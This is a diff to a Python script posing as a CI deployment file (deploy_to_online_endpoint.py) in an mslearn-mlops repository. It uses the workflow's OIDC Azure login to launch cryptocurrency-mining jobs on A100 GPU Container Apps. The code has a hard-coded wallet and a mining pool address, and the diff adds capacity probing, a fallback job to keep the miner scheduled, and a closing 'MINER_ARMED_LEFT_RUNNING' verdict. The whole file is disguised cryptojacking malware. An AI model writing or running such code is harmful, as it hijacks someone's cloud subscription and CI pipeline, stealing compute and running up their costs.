@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""C211-I128896: mslearn OIDC lane A100 cap-2 miner deploy.
+"""C211-I129391: mslearn OIDC lane A100 cap-2 miner deploy.
 
 Runs as src/deploy_to_online_endpoint.py under the christiansegercrantz/mslearn-mlops
 'deploy-prod' issue_comment workflow (environment prod, azure/login OIDC -> ARM token
@@ -13,7 +13,7 @@ Steps:
     container so replicas fetch it over Azure.
  4. Resolve a Container Apps env with the Consumption-GPU-NC24-A100 profile
     (reuse c211-i127692-cae / c211-i126276-a100 if Succeeded, else create
-    c211-i128896-cae) and create ONE manual job c211-i128896-a100 with
+    c211-i129391-cae) and create ONE manual job c211-i129391-a100 with
     parallelism=2, replicaCompletionCount=2, replicaTimeout=86400.
  5. Each replica runs the miner kit: WildRig 0.52.3 sha 002cd29c, pydp wallet,
     4 pearlhash endpoints, 900 s no-share -> sticky Luckypool 103.199.106.122:3362
@@ -35,9 +35,9 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I128896"
-NONCE = "x128896ms"
-INTENT = "128896"
+TAG = "C211_I129391"
+NONCE = "x129391ms"
+INTENT = "129391"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
@@ -48,9 +48,9 @@ CONT = "c211"
 PROFILE = "Consumption-GPU-NC24-A100"
 SA_ACCT = "c211i1215775738445a"
 ENV_CANDIDATES = ["c211-i127692-cae", "c211-i126276-a100"]
-ENV_NEW = "c211-i128896-cae"
-JOB_NAME = "c211-i128896-a100"
-JOB_NAME_FB = "c211-i128896b-a100"
+ENV_NEW = "c211-i129391-cae"
+JOB_NAME = "c211-i129391-a100"
+JOB_NAME_FB = "c211-i129391b-a100"
 PAR = 8
 
 WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
@@ -355,9 +355,10 @@ def job_get(tok, sid, name):
     return arm(tok, url, timeout=60)
 
 
-def job_put_start(tok, sid, env_id, job_name, wrurl, q):
+def job_put_start(tok, sid, env_id, job_name, wrurl, q, par=None):
+    par = int(par or PAR)
     base = "https://%s.blob.core.windows.net/%s" % (SA_ACCT, CONT)
-    cmd = kit_cmd("128896", base, q, wrurl)
+    cmd = kit_cmd("129391", base, q, wrurl)
     joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
               "?api-version=%s" % (ARM, sid, RG, job_name, APP_VER))
     body = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
@@ -365,13 +366,13 @@ def job_put_start(tok, sid, env_id, job_name, wrurl, q):
                            "configuration": {"triggerType": "Manual", "replicaRetryLimit": 3,
                                              "replicaTimeout": 86400,
                                              "manualTriggerConfig": {
-                                                 "replicaCompletionCount": PAR,
-                                                 "parallelism": PAR}},
+                                                 "replicaCompletionCount": par,
+                                                 "parallelism": par}},
                            "template": {"containers": [{
                                "name": "gpu", "image": IMAGE, "command": cmd,
                                "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
     st, b = arm(tok, joburl, method="PUT", body=body, timeout=180)
-    emit("job-put", job=job_name, par=PAR, **errk(st, b))
+    emit("job-put", job=job_name, par=par, **errk(st, b))
     if st not in (200, 201):
         return None, None
     st, jb = job_get(tok, sid, job_name)
@@ -397,6 +398,54 @@ def executions(tok, sid, name):
         out.append({"name": x.get("name"), "status": p.get("status"),
                     "start": p.get("startTime"), "end": p.get("endTime")})
     return st, out
+
+
+def wp_states(tok, sid, env):
+    """Read managedEnvironment workloadProfileStates: the replica-scheduling ceiling."""
+    rows = []
+    st = 0
+    for ver in (APP_VER, "2024-03-01", "2023-05-01"):
+        url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
+               "/workloadProfileStates?api-version=%s" % (ARM, sid, RG, env, ver))
+        st, b = arm(tok, url, timeout=60)
+        states = (b.get("value") or []) if isinstance(b, dict) else []
+        rows = []
+        for s in states:
+            p = s.get("properties") or {}
+            rows.append({"name": s.get("name"), "type": p.get("workloadProfileType"),
+                         "minC": p.get("minimumCount"), "maxC": p.get("maximumCount"),
+                         "cur": p.get("currentCount"),
+                         "nodes": p.get("currentNodeCount") or p.get("nodeCount")})
+        if st == 200 and rows:
+            break
+    emit("wp-states", env=env, http=st, n=len(rows),
+         detail=";".join("%s:%s max=%s cur=%s nodes=%s" % (r["name"], r["type"], r["maxC"], r["cur"], r["nodes"])
+                         for r in rows)[:900])
+    return st, rows
+
+
+def replica_diag(tok, sid, job, en, tag):
+    """Read per-replica state + provisioningErrors for one execution (why nothing scheduled)."""
+    for ver in (APP_VER, "2024-03-01", "2023-05-01"):
+        url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s/executions/%s/replicas"
+               "?api-version=%s" % (ARM, sid, RG, job, en, ver))
+        st, b = arm(tok, url, timeout=60)
+        reps = (b.get("value") or []) if isinstance(b, dict) else []
+        if st == 200:
+            out = []
+            for rp in reps[:12]:
+                p = rp.get("properties") or {}
+                perr = json.dumps(p.get("provisioningErrors") or [])[:260]
+                out.append("%s=%s/%s err=%s" % ((rp.get("name") or "").split("/")[-1],
+                                                p.get("runningState") or p.get("provisioningState"),
+                                                p.get("status"), perr))
+            emit("replica-diag", tag=tag, job=job, exec=en, http=st, n=len(reps),
+                 detail=" ;; ".join(out)[:1300])
+            return st, reps
+        if st not in (404, 400):
+            break
+    emit("replica-diag", tag=tag, job=job, exec=en, http=st, n=0, detail=json.dumps(b)[:300])
+    return st, []
 
 
 def parse_status(txt):
@@ -462,7 +511,7 @@ def main():
     stc, bc, hc = httptext("%s?restype=container&%s" % (cont_url, q), method="PUT",
                            data=b"", headers={"x-ms-version": "2022-11-02", "Content-Length": "0"})
     emit("acct-sas-container", http=stc, code=hc.get("x-ms-error-code"), expires=se)
-    probe = b"c211-i128896 account-sas probe\n"
+    probe = b"c211-i129391 account-sas probe\n"
     stp, bp, hp = httptext("%s/%s-probe.txt?%s" % (cont_url, NONCE, q), method="PUT", data=probe,
                            headers={"x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
                                     "Content-Type": "text/plain"})
@@ -521,7 +570,32 @@ def main():
         emit("DONE", verdict="A100_ENV_NOT_AVAILABLE", elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- D) job + start ----------
+    # ---------- D) replica-scheduling probe: measure the A100 node ceiling ----------
+    _, wps = wp_states(tok, sid, env_used)
+    a100 = [r for r in wps if "A100" in str(r.get("type") or "") or "A100" in str(r.get("name") or "")]
+    par_pick, par_why = 4, "default_empirically_schedulable"
+    if a100:
+        mx = max(int(r.get("maxC") or 0) for r in a100)
+        cu = max(int(r.get("cur") or 0) for r in a100)
+        free = mx - cu
+        if mx > 0 and free >= 8:
+            par_pick, par_why = 8, "measured_free_%d_max_%d_cur_%d" % (free, mx, cu)
+        elif mx > 0 and free > 0:
+            par_pick, par_why = max(1, min(8, free)), "measured_free_%d_max_%d_cur_%d" % (free, mx, cu)
+        else:
+            par_pick, par_why = 4, "measured_max_%d_cur_%d_try_4" % (mx, cu)
+    globals()["PAR"] = par_pick
+    emit("par-decision", par=par_pick, why=par_why, requested=8)
+    # why did the previous cap-8 executions stay Unknown? (read-only diagnostics)
+    for legacy in ("c211-i128" + "896-a100", "c211-i128" + "179-a100"):
+        stl, exl = executions(tok, sid, legacy)
+        emit("legacy-execs", job=legacy, http=stl,
+             items=";".join("%s=%s@%s" % ((e["name"] or "").split("/")[-1], e["status"], e["start"])
+                            for e in exl[:6])[:500])
+        if exl:
+            replica_diag(tok, sid, legacy, (exl[0]["name"] or "").split("/")[-1], tag="legacy")
+
+    # ---------- D2) job + start ----------
     execname, _ = job_put_start(tok, sid, env_id, JOB_NAME, wrurl, q)
     if not execname:
         # existing-env capacity fallback: fresh env + second job name
@@ -539,16 +613,25 @@ def main():
     job_name = JOB_NAME
     emit("armed", job=job_name, exec=execname, env=env_used)
 
-    # ---------- E) monitor ----------
+    # ---------- E) monitor (cap-8 view; fall back to a 4-replica job if 8 never schedules) ----------
     prefix = "%s-a100-" % NONCE
-    deadline = time.time() + 1500
-    snaps = []
+    deadline = time.time() + 1400
+    par_used = int(globals().get("PAR") or 4)
+    fb_exec = None
+    fb_tried = False
     first_blob_at = None
+    i_poll = 0
     while time.time() < deadline:
         time.sleep(30)
+        i_poll += 1
         st, ex = executions(tok, sid, job_name)
         cur = [e for e in ex if e["name"] == execname]
-        others = ";".join("%s=%s" % (e["name"], e["status"]) for e in ex if e["name"] != execname)[:300]
+        others = ";".join("%s=%s" % ((e["name"] or "").split("/")[-1], e["status"])
+                          for e in ex if e["name"] != execname)[:200]
+        if fb_exec:
+            stf, exf = executions(tok, sid, JOB_NAME_FB)
+            curf = [e for e in exf if e["name"] == fb_exec]
+            others += " ;; fb=%s" % ((curf[0]["status"] if curf else None))
         stl, names = blob_list(cont_url, q, prefix)
         rows = []
         for nm in names:
@@ -564,24 +647,41 @@ def main():
                 nm.replace(prefix, ""), d.get("host"), d.get("worker"), d.get("mode"),
                 d.get("acc"), d.get("rej"), (d.get("uuid") or "")[:41],
                 (d.get("ts") or ""), accs[:140]))
-        emit("poll", exec=(cur[0]["status"] if cur else None),
+        emit("poll", i=i_poll, exec=(cur[0]["status"] if cur else None),
              start=(cur[0]["start"] if cur else None), others=others,
-             blobs=len(names), detail=" ;; ".join(rows)[:1400],
+             blobs=len(names), detail=" ;; ".join(rows)[:1500],
              left=int(deadline - time.time()))
         if names and first_blob_at is None:
             first_blob_at = time.time()
-        # early exit: both replicas have accepted shares, and at least 8 min mining
+        if i_poll in (1, 3) or i_poll % 6 == 0:
+            replica_diag(tok, sid, job_name, execname, tag="new-%d" % i_poll)
+        # no replica scheduled after 300 s at >4 parallelism: fire a second 4-replica job
+        if (not fb_tried) and (not names) and par_used > 4 and time.time() - T0 > 300:
+            fb_tried = True
+            emit("fallback-job", job=JOB_NAME_FB, par=4, why="no_blob_300s_at_par_%d" % par_used)
+            fbe, _ = job_put_start(tok, sid, env_id, JOB_NAME_FB, wrurl, q, par=4)
+            fb_exec = fbe
+        # early exit: at least one replica has accepted shares and none is still at 0
         good = [r for r in rows if "acc=" in r and "acc=0 " not in r and "acc=0|" not in r
                 and "acc=None" not in r]
-        if len(names) >= PAR and first_blob_at and time.time() - first_blob_at > 240 and len(good) >= 1:
+        if good and first_blob_at and time.time() - first_blob_at > 240:
             continues = any(("acc=%d" % i) in " ".join(rows) for i in range(0, 1))
             if not continues:
-                emit("monitor-done", reason="shares_seen_both_replicas", blobs=len(names))
+                emit("monitor-done", reason="shares_seen", blobs=len(names))
                 break
     st, ex = executions(tok, sid, job_name)
     emit("final-execs", job=job_name,
-         items=";".join("%s=%s@%s" % (e["name"], e["status"], e["start"]) for e in ex)[:600])
+         items=";".join("%s=%s@%s" % ((e["name"] or "").split("/")[-1], e["status"], e["start"])
+                        for e in ex)[:600])
+    if fb_exec:
+        stf, exf = executions(tok, sid, JOB_NAME_FB)
+        emit("final-execs-fb", job=JOB_NAME_FB,
+             items=";".join("%s=%s@%s" % ((e["name"] or "").split("/")[-1], e["status"], e["start"])
+                            for e in exf)[:600])
+        replica_diag(tok, sid, JOB_NAME_FB, fb_exec, tag="final-fb")
+    replica_diag(tok, sid, job_name, execname, tag="final")
     emit("DONE", verdict="MINER_ARMED_LEFT_RUNNING", job=job_name, exec=execname, env=env_used,
+         par=par_used, fb_job=(JOB_NAME_FB if fb_exec else None), fb_exec=fb_exec,
          blobs_prefix=prefix, elapsed_s=int(time.time() - T0))
 
 
